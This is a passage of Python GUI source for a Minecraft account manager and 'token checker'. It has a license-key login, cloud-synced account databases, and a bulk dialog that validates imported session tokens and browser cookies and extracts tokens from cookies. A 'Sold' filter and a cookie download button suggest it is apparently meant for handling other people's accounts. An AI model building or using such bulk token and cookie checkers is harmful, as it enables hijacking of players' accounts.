        ).pack(anchor="w", pady=(0, 0))

        ctk.CTkLabel(
            title_box, text="CONSOLE.",
            font=ctk.CTkFont(size=62, weight="bold"),
            text_color=self._RED, anchor="w",
        ).pack(anchor="w", pady=(0, 16))

        ctk.CTkLabel(
            title_box,
            text="Secure access to your personal\nMinecraft Account Manager & Token Checker.",
            font=ctk.CTkFont(size=13), text_color=self._TEXT_MUTED,
            anchor="w", justify="left",
        ).pack(anchor="w")

        foot_box = ctk.CTkFrame(overlay, fg_color="transparent")
        foot_box.grid(row=2, column=0, sticky="sw")

        ctk.CTkLabel(
            foot_box, text="🔒 256-Bit Encrypted  •  Cloud Verified",
            font=ctk.CTkFont(family="Consolas", size=10),
            text_color="#4b5563",
        ).pack(anchor="w")

    def _draw_hero_background(self, event):
        w, h = event.width, event.height
        c = self._hero_canvas
        c.delete("bg_elem")

        step = 36
        for x in range(0, w, step):
            c.create_line(x, 0, x, h, fill="#121016", width=1, tags="bg_elem")
        for y in range(0, h, step):
            c.create_line(0, y, w, y, fill="#121016", width=1, tags="bg_elem")

        c.create_oval(-80, -80, 240, 240, fill="#24050b", outline="", tags="bg_elem")
        c.create_oval(-40, -40, 180, 180, fill="#180407", outline="", tags="bg_elem")

    # ── Right Form Card ────────────────────────────────────────────

    def _build_right_form(self):
        right_wrap = ctk.CTkFrame(self, fg_color="transparent")
        right_wrap.grid(row=0, column=1, sticky="nsew", padx=(16, 44), pady=36)
        right_wrap.grid_columnconfigure(0, weight=1)
        right_wrap.grid_rowconfigure(0, weight=1)

        self.card = ctk.CTkFrame(
            right_wrap, fg_color=self._CARD, corner_radius=10,
            border_width=1, border_color=self._CARD_BORDER,
        )
        self.card.grid(row=0, column=0, sticky="nsew")
        self.card.grid_columnconfigure(0, weight=1)
        self.card.bind("<Configure>", lambda e: self._draw_brackets(self.card, e.width, e.height))

        inner = ctk.CTkFrame(self.card, fg_color="transparent")
        inner.grid(row=0, column=0, sticky="nsew", padx=36, pady=32)
        inner.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(
            inner, text="CONSOLE ACCESS",
            font=ctk.CTkFont(family="Consolas", size=10, weight="bold"),
            text_color=self._RED, anchor="w",
        ).grid(row=0, column=0, sticky="w", pady=(0, 4))

        sign_row = ctk.CTkFrame(inner, fg_color="transparent")
        sign_row.grid(row=1, column=0, sticky="w", pady=(0, 2))
        ctk.CTkLabel(sign_row, text="Sign ",
                     font=ctk.CTkFont(size=32, weight="bold"), text_color="#ffffff").pack(side="left")
        ctk.CTkLabel(sign_row, text="in.",
                     font=ctk.CTkFont(size=32, weight="bold"), text_color=self._RED).pack(side="left")

        ctk.CTkLabel(
            inner, text="Welcome back. Access your console.",
            font=ctk.CTkFont(size=12), text_color=self._TEXT_MUTED, anchor="w",
        ).grid(row=2, column=0, sticky="w", pady=(0, 16))

        # USERNAME
        ctk.CTkLabel(
            inner, text="USERNAME",
            font=ctk.CTkFont(family="Consolas", size=10, weight="bold"),
            text_color="#9ca3af", anchor="w",
        ).grid(row=3, column=0, sticky="w", pady=(0, 4))

        self.username_var = ctk.StringVar(value=self._cfg.get("last_user", ""))
        self.user_entry = ctk.CTkEntry(
            inner, textvariable=self.username_var, height=42,
            placeholder_text="e.g. Zxpyar",
            fg_color="#18181d", border_color="#2a2a34", border_width=1,
            corner_radius=6, font=ctk.CTkFont(size=13),
        )
        self.user_entry.grid(row=4, column=0, sticky="ew", pady=(0, 12))

        # PASSWORD / LICENSE KEY
        ctk.CTkLabel(
            inner, text="PASSWORD / LICENSE KEY",
            font=ctk.CTkFont(family="Consolas", size=10, weight="bold"),
            text_color="#9ca3af", anchor="w",
        ).grid(row=5, column=0, sticky="w", pady=(0, 4))

        pw_row = ctk.CTkFrame(inner, fg_color="transparent")
        pw_row.grid(row=6, column=0, sticky="ew", pady=(0, 6))
        pw_row.grid_columnconfigure(0, weight=1)

        self._pw_visible = False
        self.password_var = ctk.StringVar(value=self._cfg.get("last_key", ""))
        self.pw_entry = ctk.CTkEntry(
            pw_row, textvariable=self.password_var, show="•", height=42,
            placeholder_text="e.g. DUPES-xxxxxx-xxxxxx",
            fg_color="#18181d", border_color="#2a2a34", border_width=1,
            corner_radius=6, font=ctk.CTkFont(size=13),
        )
        self.pw_entry.grid(row=0, column=0, sticky="ew")

        self.pw_toggle_btn = ctk.CTkButton(
            pw_row, text="SHOW", width=62, height=42,
            fg_color="#18181d", hover_color="#282834",
            border_width=1, border_color="#2a2a34", corner_radius=6,
            text_color="#9ca3af", font=ctk.CTkFont(family="Consolas", size=10, weight="bold"),
            command=self._toggle_pw,
        )
        self.pw_toggle_btn.grid(row=0, column=1, padx=(6, 0))

        # Remember Me & Error
        ctrl_row = ctk.CTkFrame(inner, fg_color="transparent")
        ctrl_row.grid(row=7, column=0, sticky="ew", pady=(2, 4))
        ctrl_row.grid_columnconfigure(0, weight=1)

        self.remember_var = ctk.BooleanVar(value=self._cfg.get("remember", True))
        self.remember_cb = ctk.CTkCheckBox(
            ctrl_row, text="Remember me", variable=self.remember_var,
            font=ctk.CTkFont(size=11), text_color=self._TEXT_MUTED,
            checkbox_width=18, checkbox_height=18, corner_radius=4,
            fg_color=self._YELLOW, hover_color="#d4a017", checkmark_color="#000000",
        )
        self.remember_cb.grid(row=0, column=0, sticky="w")

        self.error_label = ctk.CTkLabel(
            inner, text="", font=ctk.CTkFont(size=11),
            text_color=self._RED, anchor="w", height=20,
        )
        self.error_label.grid(row=8, column=0, sticky="w", pady=(2, 8))

        # SIGN IN Button
        self.signin_btn = ctk.CTkButton(
            inner, text="SIGN IN  ➔", height=46, corner_radius=6,
            fg_color=self._YELLOW, hover_color="#ffd000",
            text_color="#000000", font=ctk.CTkFont(size=14, weight="bold"),
            command=self._try_login,
        )
        self.signin_btn.grid(row=9, column=0, sticky="ew", pady=(0, 10))

        # Discord Link
        ctk.CTkButton(
            inner, text="💬 Discord Support & Updates", height=24,
            fg_color="transparent", hover_color="#18181d",
            text_color="#6366f1", font=ctk.CTkFont(size=11, weight="bold"),
            command=lambda: webbrowser.open(self.DISCORD_URL),
        ).grid(row=10, column=0, sticky="ew")

    # ── Corner Brackets ────────────────────────────────────────────

    def _draw_brackets(self, parent, w, h):
        for child in list(parent.winfo_children()):
            if getattr(child, "_bracket", False):
                child.destroy()

        size, offset, color, thick = 18, 8, self._RED, 2
        bg = self._CARD
        corners = [
            (offset, offset,                      [0, size, 0, 0, size, 0]),
            (w - offset - size, offset,           [0, 0, size, 0, size, size]),
            (offset, h - offset - size,           [0, 0, 0, size, size, size]),
            (w - offset - size, h - offset - size, [size, 0, size, size, 0, size]),
        ]
        for cx, cy, pts in corners:
            c = tk.Canvas(parent, width=size, height=size, bg=bg,
                          highlightthickness=0, bd=0)
            c._bracket = True
            c.place(x=cx, y=cy)
            c.create_line(*pts, fill=color, width=thick)

    def _toggle_pw(self):
        self._pw_visible = not self._pw_visible
        self.pw_entry.configure(show="" if self._pw_visible else "•")
        self.pw_toggle_btn.configure(text="HIDE" if self._pw_visible else "SHOW")

    def _try_login(self):
        username = self.username_var.get().strip()
        password = self.password_var.get().strip()
        if not username and not password:
            self.error_label.configure(text="❌ Please enter username and password/code.", text_color=self._RED)
            return

        self.signin_btn.configure(text="⏳ CHECKING LICENSE...", state="disabled")
        self.error_label.configure(text="Connecting to license server...", text_color="#f59e0b")

        def worker():
            success, matched_user, err_msg = check_credentials(username, password)

            def update_ui():
                try:
                    if not self.winfo_exists():
                        return
                except Exception:
                    return

                self.signin_btn.configure(text="SIGN IN  ➔", state="normal")

                if success:
                    if self.remember_var.get():
                        _save_config({
                            "last_user": matched_user,
                            "last_key": password,
                            "remember": True,
                        })
                    else:
                        _save_config({"remember": False})

                    self.destroy()
                    self.on_success(matched_user)
                else:
                    self.error_label.configure(
                        text=f"❌ {err_msg or 'Invalid username or license key.'}", text_color=self._RED
                    )

            self.after(0, update_ui)

        threading.Thread(target=worker, daemon=True).start()


class BulkImportDialog(ctk.CTkToplevel):
    """Progress modal dialog for processing imported tokens."""

    def __init__(self, parent, token_items, on_complete):
        super().__init__(parent)
        self.parent = parent
        self.token_items = token_items
        self.on_complete = on_complete

        self.title("⚡ Importing & Validating Tokens & Cookies")
        self.geometry("560x300")
        self.resizable(False, False)
        self.configure(fg_color="#0f0f12")

        self.grab_set()

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(3, weight=1)

        # Title
        ctk.CTkLabel(
            self, text="⚡ Bulk Account Processor", font=ctk.CTkFont(size=18, weight="bold"), text_color="#ffffff"
        ).grid(row=0, column=0, pady=(20, 6), padx=24, sticky="w")

        token_count = sum(1 for x in token_items if x.get("token"))
        cookie_count = sum(1 for x in token_items if x.get("cookie"))
        summary = f"Found {len(token_items)} item(s)  •  🔑 {token_count} Token(s)  •  🍪 {cookie_count} Cookie(s)"

        self.info_label = ctk.CTkLabel(
            self, text=summary,
            font=ctk.CTkFont(size=12), text_color="#9ca3af", anchor="w"
        )
        self.info_label.grid(row=1, column=0, pady=(0, 14), padx=24, sticky="w")

        # Progress bar
        self.progress_bar = ctk.CTkProgressBar(self, height=14, corner_radius=7, fg_color="#1e1e24", progress_color="#f5c518")
        self.progress_bar.grid(row=2, column=0, sticky="ew", padx=24, pady=(0, 12))
        self.progress_bar.set(0.0)

        # Stats Card
        stats_frame = ctk.CTkFrame(self, fg_color="#18181f", corner_radius=8)
        stats_frame.grid(row=3, column=0, sticky="nsew", padx=24, pady=(0, 20))
        stats_frame.grid_columnconfigure((0, 1, 2, 3), weight=1)

        self.stat_total = ctk.CTkLabel(stats_frame, text=f"Total: {len(token_items)}", font=ctk.CTkFont(size=12, weight="bold"), text_color="#ffffff")
        self.stat_total.grid(row=0, column=0, pady=12)

        self.stat_active = ctk.CTkLabel(stats_frame, text="✅ Active: 0", font=ctk.CTkFont(size=12, weight="bold"), text_color="#22c55e")
        self.stat_active.grid(row=0, column=1, pady=12)

        self.stat_invalid = ctk.CTkLabel(stats_frame, text="❌ Invalid: 0", font=ctk.CTkFont(size=12, weight="bold"), text_color="#ef4444")
        self.stat_invalid.grid(row=0, column=2, pady=12)

        self.stat_cookie = ctk.CTkLabel(stats_frame, text="🍪 Cookies: 0", font=ctk.CTkFont(size=12, weight="bold"), text_color="#f59e0b")
        self.stat_cookie.grid(row=0, column=3, pady=12)

        threading.Thread(target=self._process_worker, daemon=True).start()

    def _process_worker(self):
        processed_accounts = []
        total = len(self.token_items)
        active_count = 0
        invalid_count = 0
        cookie_count = 0

        for i, item in enumerate(self.token_items):
            tok = item.get("token", "").strip()
            cookie = item.get("cookie", "").strip()
            name = item.get("name", "").strip()
            email = item.get("email", "").strip()
            note = item.get("note", "").strip()

            is_valid = False
            player_name = ""
            uuid = ""
            used_cookie = False

            # Try token first
            if tok:
                is_valid, player_name, uuid, _capes = check_token_profile(tok)

            # Fallback: try cookie
            if not is_valid and cookie:
                is_valid, player_name, uuid, extracted_tok, _capes = check_cookie_profile(cookie)
                if is_valid:
                    used_cookie = True
                    if extracted_tok and not tok:
                        tok = extracted_tok

            if is_valid:
                active_count += 1
                if used_cookie:
                    cookie_count += 1
                status = "Active"
                final_name = player_name or name or "MinecraftPlayer"
            else:
                invalid_count += 1
                if cookie and not tok:
                    # Cookie with no token — unverified, keep as Unknown
                    cookie_count += 1
                    status = "Unknown"
                else:
                    # Token checked and failed
                    status = "Invalid"
                final_name = name or (f"Cookie-{cookie[:6]}" if cookie else (f"Invalid-{tok[:6]}" if len(tok) >= 6 else "Unknown"))

            acc_entry = dict(item)
            acc_entry.update({
                "name": final_name,
                "email": email,
                "status": status,
                "token": tok,
                "cookie": cookie,
                "note": note or (f"UUID: {uuid[:8]}..." if uuid else ("Cookie Account" if cookie else "Imported Token")),
                "last_checked": date.today().isoformat(),
            })
            if uuid:
                acc_entry["uuid"] = uuid
            if _capes:
                acc_entry["capes"] = _capes
            processed_accounts.append(acc_entry)

            # Update UI
            progress = (i + 1) / total
            self.after(0, lambda p=progress, a=active_count, inv=invalid_count, ck=cookie_count, cur=i+1: self._update_progress(p, cur, total, a, inv, ck))

        self.after(500, lambda: self._finish(processed_accounts))

    def _update_progress(self, prog, cur, total, active, invalid, cookies=0):
        try:
            if not self.winfo_exists():
                return
            self.progress_bar.set(prog)
            self.info_label.configure(text=f"Processed {cur} / {total} items...")
            self.stat_active.configure(text=f"✅ Active: {active}")
            self.stat_invalid.configure(text=f"❌ Invalid: {invalid}")
            self.stat_cookie.configure(text=f"🍪 Cookies: {cookies}")
        except Exception:
            pass

    def _finish(self, accounts):
        try:
            self.destroy()
        except Exception:
            pass
        self.on_complete(accounts)


class AccountManager(ctk.CTk):
    SIDEBAR_W = 160

    def __init__(self, current_user="admin"):
        super().__init__()
        self.current_user = current_user
        self.active_db_user = current_user
        self.is_admin = current_user.lower() in ("zxpyar", "admin")

        safe_name = "".join(c for c in current_user.lower() if c.isalnum() or c in "_-") or "default"
        self.data_file = APP_DIR / f"accounts_{safe_name}.json"

        self.title(f"MC Account Manager — {self.current_user}")
        self.geometry("1120x720")
        self.minsize(900, 580)

        # ── Supabase Cloud Database Config ──
        cfg = _load_config()
        self.supabase_url = cfg.get("supabase_url", DEFAULT_SUPABASE_URL)
        self.supabase_key = cfg.get("supabase_key", DEFAULT_SUPABASE_KEY)
        self.supabase_enabled = cfg.get("supabase_enabled", True)

        legacy_file = APP_DIR / "accounts.json"
        if not self.data_file.exists() and legacy_file.exists() and safe_name in ("admin", "zxpyar"):
            self.accounts = self._load_from_path(legacy_file)
            self.save_accounts()
        else:
            self.accounts = self.load_accounts()

        # ── Form state vars (shared with edit dialogs) ──
        self.name_var = ctk.StringVar()
        self.email_var = ctk.StringVar()
        self.status_var = ctk.StringVar(value=STATUS_OPTIONS[0])
        self.token_var = ctk.StringVar()
        self.cookie_var = ctk.StringVar()
        self.note_var = ctk.StringVar()
        self.last_checked_var = ctk.StringVar()

        # Label refs inside edit dialog (may be None when dialog is closed)
        self.token_status_label = None
        self.cookie_status_label = None
        self.avatar_label = None
        self._cookie_visible = False
        self.token_form_visible = False

        # Attach auto-validation once (works regardless of open dialogs)
        self.token_var.trace_add("write", self._on_token_changed)
        self.cookie_var.trace_add("write", self._on_cookie_changed)
        self.name_var.trace_add("write", self._on_name_changed)

        # ── UI state ──
        self.selected_index = None
        self.row_frames = []
        self.token_visible_rows = {}
        self.skin_cache = {}
        self._skin_after_id = None
        self._token_check_after_id = None
        self._cookie_check_after_id = None
        self.sort_by_var = ctk.StringVar(value="Active First")
        self.filter_var = ctk.StringVar(value="All")
        self.search_var = ctk.StringVar()
        self.search_var.trace_add("write", lambda *_: self._refresh_list())
        self.view_mode = "grid"
        self._current_page = "accounts"
        self._pages = {}

        self.grid_columnconfigure(0, weight=0)
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self._build_sidebar()
        self._build_content_area()
        self.sort_accounts()
        self._refresh_list()

        # Auto-pull cloud accounts on start
        if self.supabase_enabled and self.supabase_url and self.supabase_key:
            self._async_pull_supabase(silent=True)

    # ─────────────────── HELPERS ─────────────────────────────────────────

    def _get_all_available_users(self) -> list[str]:
        users_set = {self.current_user.capitalize()}
        try:
            for u in _load_online_users().keys():
                users_set.add(str(u).capitalize())
            for u in _load_users().keys():
                users_set.add(str(u).capitalize())
        except Exception:
            pass
        try:
            for f in APP_DIR.glob("accounts_*.json"):
                u_name = f.stem.replace("accounts_", "")
                if u_name:
                    users_set.add(u_name.capitalize())
        except Exception:
            pass
        try:
            url = getattr(self, "supabase_url", DEFAULT_SUPABASE_URL)
            key = getattr(self, "supabase_key", DEFAULT_SUPABASE_KEY)
            if url and key:
                for o in supabase_fetch_all_owners(url, key):
                    users_set.add(o)
        except Exception:
            pass
        res = sorted(list(users_set))
        if self.is_admin:
            return ["👑 ALL USERS"] + res
        return res

    # ─────────────────── SIDEBAR ─────────────────────────────────────────

    def _build_sidebar(self):
        sb = ctk.CTkFrame(self, fg_color="#0d1117", corner_radius=0, width=self.SIDEBAR_W)
        sb.grid(row=0, column=0, sticky="nsew")
        sb.grid_propagate(False)
        sb.grid_rowconfigure(9, weight=1)
        sb.grid_columnconfigure(0, weight=1)

        # Logo + App name
        logo_box = ctk.CTkFrame(sb, fg_color="transparent")
        logo_box.grid(row=0, column=0, sticky="ew", padx=14, pady=(20, 16))
        ctk.CTkLabel(logo_box, text="⛏", font=ctk.CTkFont(size=22), text_color="#3b82f6").pack(side="left")
        ctk.CTkLabel(logo_box, text="  MC Manager", font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#e5e7eb").pack(side="left")

        # Divider
        ctk.CTkFrame(sb, fg_color="#1f2937", height=1).grid(row=1, column=0, sticky="ew", padx=12, pady=(0, 8))

        self._sidebar_btns = {}
        nav = [
            ("accounts",  "👤", "Accounts"),
            ("launcher",  "🎮", "Game Launcher"),
            ("profile",   "🎭", "Skin & Profile"),
            ("converter", "🔑", "Token Converter"),
            ("paste",     "📋", "Paste / Import"),
            ("settings",  "⚙️", "Settings & Export"),
        ]
        for r, (page, icon, label) in enumerate(nav, start=2):
            btn = ctk.CTkButton(
                sb, text=f"  {icon}  {label}",
                width=self.SIDEBAR_W - 16, height=38, corner_radius=10,
                font=ctk.CTkFont(size=11, weight="bold"),
                anchor="w",
                fg_color="#1f2937" if page == "accounts" else "transparent",
                hover_color="#1f2937",
                command=lambda p=page: self._switch_page(p),
            )
            btn.grid(row=r, column=0, pady=2, padx=8, sticky="ew")
            self._sidebar_btns[page] = btn

        if self.is_admin:
            all_users = self._get_all_available_users()
            self.admin_user_var = ctk.StringVar(value=self.active_db_user)
            # Divider
            ctk.CTkFrame(sb, fg_color="#1f2937", height=1).grid(row=9, column=0, sticky="ew", padx=12, pady=(4, 4))
            admin_box = ctk.CTkFrame(sb, fg_color="transparent")
            admin_box.grid(row=10, column=0, sticky="ew", padx=10, pady=(2, 0))
            ctk.CTkLabel(admin_box, text="👑 DB:", font=ctk.CTkFont(size=10, weight="bold"),
                         text_color="#f59e0b").pack(side="left", padx=(2, 4))
            self.db_selector = ctk.CTkOptionMenu(
                admin_box, values=all_users, variable=self.admin_user_var,
                width=90, height=24, font=ctk.CTkFont(size=10),
                fg_color="#374151", button_color="#4b5563", button_hover_color="#6b7280",
                command=self._switch_database, dynamic_resizing=False,
            )
            self.db_selector.pack(side="left")

        # Divider before logout
        ctk.CTkFrame(sb, fg_color="#1f2937", height=1).grid(row=11, column=0, sticky="ew", padx=12, pady=(4, 4))
        ctk.CTkButton(
            sb, text="  🚪  Logout", width=self.SIDEBAR_W - 16, height=36, corner_radius=8,
            font=ctk.CTkFont(size=11, weight="bold"), anchor="w",
            fg_color="transparent", hover_color="#7f1d1d", text_color="#9ca3af",
            command=self._switch_user,
        ).grid(row=12, column=0, padx=8, pady=(0, 18), sticky="ew")

    def _switch_page(self, page):
        for p, btn in self._sidebar_btns.items():
            btn.configure(fg_color="#1f2937" if p == page else "transparent")
        if page == "paste":
            self.open_paste_dialog()
            return
        for p, frame in self._pages.items():
            if p == page:
                frame.grid()
            else:
                frame.grid_remove()
        self._current_page = page
        if page == "profile" and hasattr(self, "_prof_acc_dropdown"):
            acc_names = [a.get("name", "Account") for a in self.accounts if a.get("name")] or ["— No Accounts —"]
            self._prof_acc_dropdown.configure(values=acc_names)
        elif page == "launcher" and hasattr(self, "_launcher_acc_dropdown"):
            acc_names = [a.get("name", "Account") for a in self.accounts if a.get("name")] or ["— No Accounts —"]
            self._launcher_acc_dropdown.configure(values=acc_names)
            if acc_names and self._launch_acc_var.get() not in acc_names:
                self._launch_acc_var.set(acc_names[0])
                self._on_launcher_account_selected(acc_names[0])
            self._refresh_launcher_versions()

    # ─────────────────── CONTENT AREA ────────────────────────────────────

    def _build_content_area(self):
        content = ctk.CTkFrame(self, fg_color="transparent", corner_radius=0)
        content.grid(row=0, column=1, sticky="nsew")
        content.grid_columnconfigure(0, weight=1)
        content.grid_rowconfigure(1, weight=1)

        self._build_topbar(content)

        # Accounts page
        acc_frame = ctk.CTkFrame(content, fg_color="transparent", corner_radius=0)
        acc_frame.grid(row=1, column=0, sticky="nsew")
        acc_frame.grid_columnconfigure(0, weight=1)
        acc_frame.grid_rowconfigure(1, weight=1)
        self._build_scrollable_area(acc_frame)
        self._pages["accounts"] = acc_frame

        # Game Launcher page
        launcher_frame = ctk.CTkFrame(content, fg_color="transparent", corner_radius=0)
        launcher_frame.grid(row=1, column=0, sticky="nsew")
        self._build_launcher_page(launcher_frame)
        self._pages["launcher"] = launcher_frame
        launcher_frame.grid_remove()

        # Player Profile / 3D Skin Viewer page
        prof_frame = ctk.CTkFrame(content, fg_color="transparent", corner_radius=0)
        prof_frame.grid(row=1, column=0, sticky="nsew")
        self._build_profile_page(prof_frame)
        self._pages["profile"] = prof_frame
        prof_frame.grid_remove()

        # Token Converter page
        conv_frame = ctk.CTkFrame(content, fg_color="transparent", corner_radius=0)
        conv_frame.grid(row=1, column=0, sticky="nsew")
        self._build_token_converter_page(conv_frame)
        self._pages["converter"] = conv_frame
        conv_frame.grid_remove()

        # Settings & Export page
        sett_frame = ctk.CTkFrame(content, fg_color="transparent", corner_radius=0)
        sett_frame.grid(row=1, column=0, sticky="nsew")
        self._build_settings_page(sett_frame)
        self._pages["settings"] = sett_frame
        sett_frame.grid_remove()

    def _build_topbar(self, parent):
        bar = ctk.CTkFrame(parent, fg_color="#0d1117", corner_radius=0, height=56)
        bar.grid(row=0, column=0, sticky="ew")
        bar.grid_columnconfigure(1, weight=1)
        bar.grid_propagate(False)

        # Left: title
        title_box = ctk.CTkFrame(bar, fg_color="transparent")
        title_box.grid(row=0, column=0, sticky="w", padx=(16, 8), pady=10)
        ctk.CTkLabel(title_box, text="Minecraft Accounts",
                     font=ctk.CTkFont(size=15, weight="bold")).pack(side="left")
        self.sub_user_label = ctk.CTkLabel(
            title_box, text=f"  •  {self.current_user}",
            font=ctk.CTkFont(size=11), text_color="#f5c518",
        )
        self.sub_user_label.pack(side="left")

        # Center: search
        search_frame = ctk.CTkFrame(bar, fg_color="transparent")
        search_frame.grid(row=0, column=1, sticky="ew", padx=8, pady=10)
        ctk.CTkEntry(
            search_frame, textvariable=self.search_var,
            placeholder_text="🔍  Search accounts...",
            height=34, corner_radius=8, border_color="#374151", fg_color="#1f2937",
        ).pack(fill="x")

        # Right: buttons
        right = ctk.CTkFrame(bar, fg_color="transparent")
        right.grid(row=0, column=2, sticky="e", padx=(8, 14), pady=10)

        self.count_label = ctk.CTkLabel(right, text="", font=ctk.CTkFont(size=11), text_color="#6b7280")
        self.count_label.pack(side="left", padx=(0, 8))

        for text, color, hover, cmd, w in [
            ("📦 Import",  "#3b82f6", "#2563eb", self.import_files,         90),
            ("🔄 Check",   "#374151", "#4b5563", self.check_all_accounts,   80),
            ("⬇ Cookies", "#b45309", "#92400e", self.download_active_cookies, 90),
            ("+  Add",     "#22c55e", "#16a34a", lambda: self._open_edit_dialog(None), 72),
        ]:
            ctk.CTkButton(right, text=text, width=w, height=32,
                          font=ctk.CTkFont(size=11, weight="bold"),
                          fg_color=color, hover_color=hover,
                          text_color="#000000" if "Add" in text else "#ffffff",
                          corner_radius=7, command=cmd).pack(side="left", padx=2)

        self._view_btn = ctk.CTkButton(
            right, text="☰", width=32, height=32, font=ctk.CTkFont(size=15),
            fg_color="#374151", hover_color="#4b5563", corner_radius=7,
            command=self._toggle_view_mode,
        )
        self._view_btn.pack(side="left", padx=2)

    def _toggle_view_mode(self):
        if self.view_mode == "grid":
            self.view_mode = "list"
            self._view_btn.configure(text="⊞")
        else:
            self.view_mode = "grid"
            self._view_btn.configure(text="☰")
        self._refresh_list()

    # ─────────────────── SCROLLABLE AREA ─────────────────────────────────

    def _build_scrollable_area(self, parent):
        # Sub-toolbar: sort + filter
        toolbar = ctk.CTkFrame(parent, fg_color="#111827", height=36, corner_radius=0)
        toolbar.grid(row=0, column=0, sticky="ew")
        toolbar.grid_propagate(False)

        left_tools = ctk.CTkFrame(toolbar, fg_color="transparent")
        left_tools.pack(side="left", padx=10, pady=4)

        ctk.CTkLabel(left_tools, text="Sort:", font=ctk.CTkFont(size=11), text_color="#6b7280").pack(side="left")
        ctk.CTkOptionMenu(
            left_tools, variable=self.sort_by_var,
            values=["Active First", "Name (A-Z)", "Last Checked", "Status"],
            width=110, height=24, font=ctk.CTkFont(size=11),
            command=lambda v: self.sort_accounts(v),
        ).pack(side="left", padx=(4, 10))

        ctk.CTkLabel(left_tools, text="Filter:", font=ctk.CTkFont(size=11), text_color="#6b7280").pack(side="left")
        ctk.CTkOptionMenu(
            left_tools, variable=self.filter_var,
            values=["All", "Active Only", "Invalid / Banned", "Cookies Only", "Tokens Only", "Sold"],
            width=120, height=24, font=ctk.CTkFont(size=11),
            command=lambda _: self._refresh_list(),
        ).pack(side="left", padx=4)

        # Native CTkScrollableFrame for top-to-bottom scroll
        self.scroll = ctk.CTkScrollableFrame(parent, fg_color="transparent", corner_radius=0)
        self.scroll.grid(row=1, column=0, sticky="nsew", padx=2, pady=2)

    # ─────────────────── PLAYER PROFILE / SKIN VIEWER ────────────────────

    def _build_profile_page(self, parent):
        parent.grid_columnconfigure(0, weight=1)
        parent.grid_columnconfigure(1, weight=1)
        parent.grid_rowconfigure(1, weight=1)

        # Header
        head = ctk.CTkFrame(parent, fg_color="transparent")
        head.grid(row=0, column=0, columnspan=2, sticky="ew", padx=24, pady=(20, 10))
        ctk.CTkLabel(head, text="Player Profile & 3D Skin Viewer", font=ctk.CTkFont(size=22, weight="bold")).pack(anchor="w")
        ctk.CTkLabel(head, text="Inspect Minecraft skins in 3D, detect capes, and download skin PNGs.",
                     font=ctk.CTkFont(size=12), text_color="#9ca3af").pack(anchor="w", pady=(2, 0))

        # Left Column: Search & Details Card
        left_card = ctk.CTkFrame(parent, fg_color="#1f2937", corner_radius=14)
        left_card.grid(row=1, column=0, sticky="nsew", padx=(24, 12), pady=(0, 24))
        left_card.grid_columnconfigure(0, weight=1)

        # Search Bar
        sf = ctk.CTkFrame(left_card, fg_color="transparent")
        sf.pack(fill="x", padx=16, pady=16)
        ctk.CTkLabel(sf, text="SEARCH PLAYER / PICK ACCOUNT", font=ctk.CTkFont(size=10, weight="bold"), text_color="#6b7280").pack(anchor="w", pady=(0, 4))

        s_row = ctk.CTkFrame(sf, fg_color="transparent")
        s_row.pack(fill="x")
        self._prof_search_var = ctk.StringVar()
        self._prof_search_entry = ctk.CTkEntry(
            s_row, textvariable=self._prof_search_var, placeholder_text="Username or UUID...",
            height=36, corner_radius=8, fg_color="#111827", border_color="#374151"
        )
        self._prof_search_entry.pack(side="left", fill="x", expand=True, padx=(0, 8))
        self._prof_search_entry.bind("<Return>", lambda e: self._load_profile_view())

        ctk.CTkButton(
            s_row, text="🔍 Look Up", width=84, height=36, corner_radius=8,
            font=ctk.CTkFont(size=12, weight="bold"), fg_color="#3b82f6", hover_color="#2563eb",
            command=self._load_profile_view
        ).pack(side="left")

        # Account Dropdown Picker
        acc_names = [a.get("name", "Account") for a in self.accounts if a.get("name")] or ["— No Accounts —"]
        self._prof_acc_picker_var = ctk.StringVar(value=acc_names[0] if acc_names else "")
        picker_row = ctk.CTkFrame(sf, fg_color="transparent")
        picker_row.pack(fill="x", pady=(8, 0))
        ctk.CTkLabel(picker_row, text="Quick Select:", font=ctk.CTkFont(size=11), text_color="#9ca3af").pack(side="left", padx=(0, 8))
        self._prof_acc_dropdown = ctk.CTkOptionMenu(
            picker_row, values=acc_names, variable=self._prof_acc_picker_var,
            height=28, font=ctk.CTkFont(size=11),
            fg_color="#374151", button_color="#4b5563", button_hover_color="#6b7280",
            command=lambda val: self._on_prof_picker_select(val)
        )
        self._prof_acc_dropdown.pack(side="left", fill="x", expand=True)

        # Info Box
        info_box = ctk.CTkFrame(left_card, fg_color="#111827", corner_radius=10)
        info_box.pack(fill="both", expand=True, padx=16, pady=(0, 16))

        # Avatar Head + Name + Status
        p_head = ctk.CTkFrame(info_box, fg_color="transparent")
        p_head.pack(fill="x", padx=14, pady=12)
        self._prof_av_lbl = ctk.CTkLabel(p_head, text="?", width=50, height=50, fg_color="#374151",
                                          corner_radius=25, font=ctk.CTkFont(size=18))
        self._prof_av_lbl.pack(side="left")

        p_name_box = ctk.CTkFrame(p_head, fg_color="transparent")
        p_name_box.pack(side="left", padx=(12, 0), fill="x", expand=True)
        self._prof_name_lbl = ctk.CTkLabel(p_name_box, text="Steve", font=ctk.CTkFont(size=16, weight="bold"), anchor="w")
        self._prof_name_lbl.pack(fill="x")
        self._prof_status_lbl = ctk.CTkLabel(p_name_box, text=" Active ", font=ctk.CTkFont(size=10, weight="bold"),
                                             fg_color="#22c55e", text_color="#ffffff", corner_radius=4, height=18)
        self._prof_status_lbl.pack(anchor="w", pady=(2, 0))

        # UUID info
        self._prof_uuid_lbl = ctk.CTkLabel(info_box, text="UUID: —", font=ctk.CTkFont(family="Consolas", size=11), text_color="#9ca3af", anchor="w")
        self._prof_uuid_lbl.pack(fill="x", padx=14, pady=(4, 2))

        # Capes row
        ctk.CTkLabel(info_box, text="CAPES & COSMETICS", font=ctk.CTkFont(size=9, weight="bold"), text_color="#6b7280", anchor="w").pack(fill="x", padx=14, pady=(8, 2))
        self._prof_capes_frame = ctk.CTkFrame(info_box, fg_color="transparent")
        self._prof_capes_frame.pack(fill="x", padx=14, pady=(0, 8))
        self._prof_capes_lbl = ctk.CTkLabel(self._prof_capes_frame, text="— No Capes Detected —", font=ctk.CTkFont(size=11), text_color="#6b7280", anchor="w")
        self._prof_capes_lbl.pack(anchor="w")

        # Action Buttons
        btn_box = ctk.CTkFrame(left_card, fg_color="transparent")
        btn_box.pack(fill="x", padx=16, pady=(0, 16))

        ctk.CTkButton(
